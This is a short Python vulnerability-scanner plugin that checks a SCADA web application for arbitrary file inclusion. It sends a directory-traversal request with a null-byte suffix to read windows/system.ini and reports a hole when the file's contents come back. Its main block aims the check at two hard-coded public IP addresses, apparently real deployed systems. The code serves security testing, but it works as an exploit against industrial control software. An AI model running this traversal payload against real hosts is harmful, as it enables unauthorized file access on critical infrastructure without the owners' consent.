#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:SCADA通用系统任意文件包含2
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0131719


import urlparse
def assign(service, arg):
    if service == 'dfe_scada':
        arr = urlparse.urlparse(arg)
        return True, arg

def  audit(arg):
    url=arg+"modules/tmr/server/switchControlPanel.php?func=../../../../../../../../../../../../windows/system.ini%00.htm"
    code,head,res,errcode,finalurl=curl.curl2(url)
    if code==200 and  "wave=mmdrv.dll" in res:
        security_hole('file download Vulnerable:'+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('dfe_scada','http://221.214.179.228:5000/')[1])
    audit(assign('dfe_scada','http://124.129.7.215/')[1])